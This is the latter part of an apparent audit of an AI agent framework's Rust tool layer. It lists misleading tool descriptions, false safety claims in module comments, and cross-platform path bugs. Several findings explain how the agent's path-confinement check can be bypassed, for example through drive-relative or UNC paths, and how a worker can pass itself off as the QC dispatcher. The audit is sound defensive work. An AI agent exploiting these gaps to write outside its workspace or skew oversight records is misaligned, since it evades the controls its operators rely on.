| 28 | `check_file` (`type_checker`) | **FALSE** | Schema offers `["auto","mypy","pyright","tsc","eslint"]` | 3 are indistinguishable from `auto`; `"eslint"` on a `.ts` file is silently overridden to tsc | Model believes it selected a checker it did not get | G10-84 |
| 29 | `write_interface_spec` / `write_interface_spec.rs` | **UNENFORCED**, **OMITS-COST** | "REQUIRED before qc_review on any task that produces or modifies HTTP routes"; "fields not declared here will be flagged by the api_contract check" | Nothing gates `qc_review` on it; the api_contract check skips silently when INTERFACE.md is absent. Omits that the **default mode destroys the file** | Worker adds one route with the default mode and wipes the contract, believing it is enforcing one | G10-79, G10-80 |
| 30 | `spawn_qc_review` / `spawn_qc_review.rs` | **UNENFORCED** | "Only the qc-dispatcher recipe should call this; workers must not" | No caller check; `parent_slug` is hardcoded to `QC_DISPATCHER_SLUG`, so a worker calling it is *recorded as* the dispatcher | Any worker can dispatch reviews and skew all QC accounting | §2.7 |
| 31 | `assign_tasks` / `assign_tasks_batch.rs` | **FALSE (unverifiable)** | "one batch call is **~10× faster** than N sequential calls" | The saving is real (one DB open, then a loop) but the number is invented; no benchmark exists in the tree | Model over-batches on a fabricated figure | §2.3 |
| 32 | `assign_task` / `assign_task.rs` | **FALSE (latent)** | Worker list hardcoded in prose: "worker-backend, worker-frontend, worker-platform, worker-mcp, worker-cleanup" | The schema enum is generated from `FLEET_WORKERS`; the prose is a literal copy | Adding a sixth worker updates the enum and leaves the description lying — the exact drift the K.9 comment claims to have fixed | G10-36 |
| 33 | `planner` / `planner.rs` | **OMITS-CONSTRAINT** | "YAML DSL planning interface. Pass 'action: listActions' to see all actions and schemas." | The entire interface is one opaque string; no action's arguments are described anywhere in the schema | Model must burn a discovery round-trip or guess — and it is 1 of only 4 Delegate tools | G10-107 |

### 5.2 The 5 clean descriptions

| Tool | Note |
|---|---|
| `read_file` | Best-written description in the tree: states both caps, the paging protocol, and the errors restate them with a concrete retry call. Its *defects* (G10-07, T12) are in the body, not the prose |
| `get_epic_progress` | Accurately names every returned field and the sequencing rule ("use this to determine which tasks can be assigned next") |
| `get_ready_tasks_in_phase` | Accurate; correctly points at `get_epic_progress` as the prerequisite |
| `suggest_worker` | Accurately names the return fields and the three methods (`static`/`historical`/`default`) |
| `search_memory` | Accurate about tiers and ranking; the `limit` clamp is enforced in code as well as declared |

Note that `get_epic_progress` and `get_ready_tasks_in_phase` are clean as *prose*
but both inherit the `epic_id`-as-string trap (G10-41) from their schemas.

### 5.3 The 4 helper modules and the 2 uncompiled modules

These have no `description()`, so their equivalent surface is the module doc
comment — read by every future maintainer, and in three cases by anyone auditing
safety. All six are covered here for completeness of the 44.

| Module | Has `description()` | Doc-comment defect | Finding |
|---|---|---|---|
| `path_jail.rs` | no | Header calls itself "a Rust-side **load-bearing safety net**" that "must remain in place"; it is a TOCTOU-vulnerable advisory check that 5 path-taking tools never call | G10-90 |
| `path_lock.rs` | no | `:40-41` promises "PA-mode and Mode 2 callers contend on the same key" — they do not, because the key is a raw spelling (G10-92). `:20-23` claims "Two callers passing equivalent paths … hash to the same slot" — true only for `.`/`..`, not for case or canonicalisation | G10-92, G10-09 |
| `build_evidence.rs` | no | `:39` documents `Node` as covering `npm run dev`; `node_hits` does not contain it. `:10-12` correctly says "We don't need accuracy — we need a directional signal", but the consumer uses it as a **hard blocking gate** | G10-96, G10-98 |
| `validate.rs` | no | `:4-5` defines tier 1 as "fast syntax: in-process … or **lightweight** subprocess (py_compile, node --check)" — tier 1 also spawns a full `tsc` on every `.ts/.tsx/.jsx` write | G10-105 |
| `graph_tools.rs` | 5 descriptions, **never compiled** | The module is absent from `mod.rs:6-72`, and `mcp_server/server.rs:149` lists it under "NOT exposed (**intentional**)" with a rationale — actively concealing a compilation gap as a design choice | T32/G-1 |
| `graph_prompts.rs` | no, **never compiled** | Same | T32/G-1 |

### 5.4 Two module comments inside audited tools that assert false safety properties

Not `description()` strings, but the same failure mode aimed at maintainers rather
than the model, and both were relied on during this audit before being checked:

- **`e2e_probe.rs:20-22`** — "Composability with the runner.rs path-jail: the probe
  walks `working_dir` to launch its children, so a misconfigured workspace can't
  reach the wrong tree." `current_dir()` sets a starting directory; it constrains
  nothing. The tool calls no jail at all (G10-73).
- **`spawn_qc_review.rs:92-94`** — "Guard reads/writes a module-level counter so
  it's thread-safe and **lock-free**." It is a `Mutex<Vec<Entry>>` (`:362`). The
  same comment block reasons carefully about not leaking *claim* state while the
  code leaks *cost* state on eight paths (G10-67).

---

## 6. Cross-platform table

**There is no macOS-specific code anywhere in `builtin_tools/`.** Every platform
branch in the directory is a two-way `cfg!(target_os = "windows")` /
`#[cfg(windows)]` split (`bash.rs:22,79,89,149`, `e2e_probe.rs:179`,
`path_jail.rs:103,122`, `validate.rs:885`), so macOS is compiled and reasoned about
as Linux. That is correct for shell (`sh -c`), venv layout (`bin/python3`) and
console scripts, and **wrong for filesystem case sensitivity** — APFS and HFS+ are
case-insensitive by default, so every "Linux = case-sensitive" assumption below
also breaks on stock macOS.

| path:line | Assumption | Breaks on |
|---|---|---|
| `bash.rs:79-87` | A command written for a POSIX shell can be rewritten into PowerShell idioms and then executed by `cmd /C` | **Windows.** The rewrite targets PowerShell; the shell is `cmd`. Rewritten pipes are handed to an interpreter that does not understand them (given finding) |
| `bash.rs:22-25` | Two descriptions suffice: a Windows one and everything else | **Windows.** The Windows string tells the model "The shell is Windows CMD… Use PowerShell-compatible alternatives" — mutually exclusive instructions in one sentence (§5 #8) |
| `bash.rs:149-153` | A failed command can be recognised by the English substring `"is not recognized"` | **Non-English Windows.** `cmd.exe` localises this message, so the exit-255 hint never fires on a German/Japanese/Spanish install — and the hint it would have given is wrong anyway |
| `bash.rs:134-141` | The byte at `tail_start` is a character boundary | **Every platform.** `find('\n')` yields a boundary but the `unwrap_or(tail_start)` fallback is a raw byte index → panic (T18) |
| `bash.rs:187` | Dropping a `tokio::process::Command` future ends the process | **Every platform, worst on Windows.** `kill_on_drop` is unset; on Windows the whole `cmd /C` subtree survives (G10-24) |
| `bash.rs:283-300` | A redirect target that resolves outside the workspace is a mistake | **Every platform.** `2>/dev/null` (Unix) and `> NUL` (Windows) are the most common redirects in existence; both are refused, and `NUL` resolves to `<ws>\NUL`, a reserved device name (G10-26) |
| `e2e_probe.rs:179-197` | Killing the spawned child kills the server it started | **Windows.** `cmd /C npm run dev` — killing `cmd.exe` orphans `node.exe`, which keeps the port (G10-75). Partly true on Unix too when `sh -c` runs a chain rather than a single `exec`-able command |
| `path_jail.rs:39-83` | `Path::exists()` fails for any path traversing a non-existent directory, so `..` in the tail is unreachable | **Linux and macOS.** There, `exists()` is per-component and the walk-up branch is entered, silently deleting `..` components and rewriting the path (G10-87). On Windows Win32 collapses `..` lexically first, so the same input behaves differently |
| `path_jail.rs:89-96` | `canonicalize()` returns at most a `\\?\` prefix | **Windows with a UNC workspace.** It returns `\\?\UNC\server\share\…`; stripping only `\\?\` leaves the relative-looking `UNC\server\share\…`, which is then returned as the write target (G10-88) |
| `path_jail.rs:122-127` | Non-Windows filesystems are case-sensitive, so exact component comparison is correct | **macOS.** APFS/HFS+ are case-insensitive by default. `canonicalize` normalises existing paths so this usually fails *closed* (spurious refusal) rather than open — safe, but the asymmetry with the `#[cfg(windows)]` branch above is unintentional |
| `path_lock.rs:58-84` | Two spellings of one path are the same string, so a lexical key is sufficient | **Windows and macOS.** Both are case-insensitive; the key is neither case-folded nor canonicalised, so `C:\a\b.rs` and `c:\a\b.rs` are two mutexes for one file (G10-92, G10-09). This is the single most consequential cross-platform assumption in the tree |
| `read_file.rs:196-199` (and the same helper in `write_file`, `edit_file`, `append_file`, `grep`, `glob`) | `!is_absolute()` ⇒ safe to `join` onto `working_dir` | **Windows.** `C:foo` is drive-relative: not absolute, but `PathBuf::push` with a prefix-and-no-root path **replaces self**, discarding `working_dir` entirely (G10-89) |
| `list_directory.rs:123` | `Path::display()` is a fine wire format | **Windows.** Emits `src\foo.rs` while `grep`/`glob` normalise to `/` — two path dialects from three tools in one session (G10-18) |
| `grep.rs:177` | A backslash in a path is always a separator | **Linux and macOS.** `.replace('\\', "/")` corrupts filenames that legitimately contain a backslash (G10-22) |
| `validate.rs:269` (`tsc`), `validate.rs:801-808` (`eslint`) | `Command::new("<bin>")` resolves an npm-installed console script | **Windows.** npm installs `tsc.cmd` / `tsc.ps1`, and `CreateProcess` does not apply `PATHEXT` to a bare name the way `cmd` does — so the spawn fails, the failure is a *warning*, warnings are "clean", and `check_file` prints "✓ No syntax errors" (T54 + G10-16). `mypy` and `pyright` are unaffected because pip generates real `.exe` shims |
| `validate.rs:885-904` | The venv interpreter lives at `Scripts\python.exe` (Windows) or `bin/python3` (else) | **Correct on all three** — but it is the vector for G10-86 on all three, because the binary comes from the workspace |
| `validate.rs:919-932` | `current == root` is a reliable containment stop | **Windows and macOS.** Raw `PathBuf` equality on unnormalised, differently-cased paths never matches, so `find_upward` walks to the filesystem root and can pick up a foreign `tsconfig.json` or `INTERFACE.md` (G10-103) |
| `validate.rs:186-189` (`py_compile`) | Syntax checking does not mutate the tree | **Every platform.** `py_compile` writes `__pycache__/*.pyc` next to the source — a filesystem mutation from a tool declaring `is_read_only() = true` (G10-15) |
| `validate.rs:186-189`, `:221-224` | The checker's working directory does not matter | **Every platform.** Neither `check_python_syntax` nor `check_node_syntax` sets `current_dir`, so they run in the process CWD (`src-tauri/` under `tauri dev`) while `check_tsc_syntax` and tier 3 correctly set it |
| `write_file.rs` (content write) | `\n` line endings are universally acceptable | **Windows.** No normalisation; agent-authored `\n` content mixes with CRLF files maintained by other tooling (G10-12) |
| `create_task.rs:59`, `send_worker_message.rs` (4096), `remember_this.rs:94` (120), `annotate_file_tool.rs:99` (80) | `String::len()` is a character count | **Every platform, any non-ASCII text.** Rejects a 40-character CJK title as ">120 characters" (G10-30); panics mid-codepoint in the latter two (G10-54, G10-61) |

**The load-bearing pattern.** Ten of the twenty rows above are a single assumption
restated: *a path is a string, and two strings that name the same file are equal*.
`path_jail` is the only module that actually confronts it — it lowercases on
Windows (`:105-106`), strips verbatim prefixes, and compares componentwise
elsewhere. Every other path-handling site in the tree (`path_lock::lock_key`,
`find_upward`, `resolve_path`, `list_directory`'s `display()`, `grep`'s backslash
replace) treats paths as ordinary strings, and each one breaks differently on the
platform this project is actually developed on.

---

*End of G10 tool-surface audit. §1–§2.6 were written in a prior pass; §2.7, §2.8,
§3, §4, §5 and §6 were appended in this one. New finding ids issued here:
**G10-56 … G10-113**.*
